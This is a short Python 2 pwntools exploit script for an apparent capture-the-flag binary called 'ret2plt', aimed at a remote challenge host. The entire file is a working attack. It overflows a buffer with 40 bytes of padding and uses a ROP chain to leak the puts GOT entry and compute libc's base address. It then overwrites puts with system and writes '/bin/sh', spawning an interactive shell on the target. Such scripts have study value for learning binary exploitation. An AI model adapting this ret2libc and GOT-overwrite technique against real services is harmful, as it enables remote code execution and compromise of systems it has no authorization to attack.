#!/usr/bin/env python
from pwn import *

elf = ELF("ret2plt")
libc = elf.libc

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = False
if DEBUG:
    p = process("ret2plt")
    # p = remote("127.0.0.1", 8888)
else:
    p = remote("pwnhub.tw", 56026)

pop_rdi = 0x00000000004006f3    # pop rdi ; ret
puts_got = elf.got["puts"]
puts_plt = 0x4004e0
gets_plt = 0x400510
system_offset = 0x0000000000045390
puts_offset = 0x000000000006f690
rop_chain = flat([pop_rdi, puts_got,
                  puts_plt, # call puts to leak puts_got
                  pop_rdi, puts_got,
                  gets_plt, # call gets to write system to puts got
                  pop_rdi, puts_got+8, # write /bin/sh in puts_got+8
                  puts_plt
                  ])

padding = "A" * 40
payload = padding + rop_chain

p.recv()
# raw_input()
p.sendline(payload)

p.recvline()
# make address len is 8 byte
puts_addr = u64(p.recvline().strip().ljust(8, "\x00"))
system_addr = puts_addr - puts_offset + system_offset
print "[+] Leak puts address %x" % puts_addr

print "[+] Leak libc address and send /bin/sh"
p.sendline(p64(system_addr) + "/bin/sh\x00")

p.interactive()
p.close()
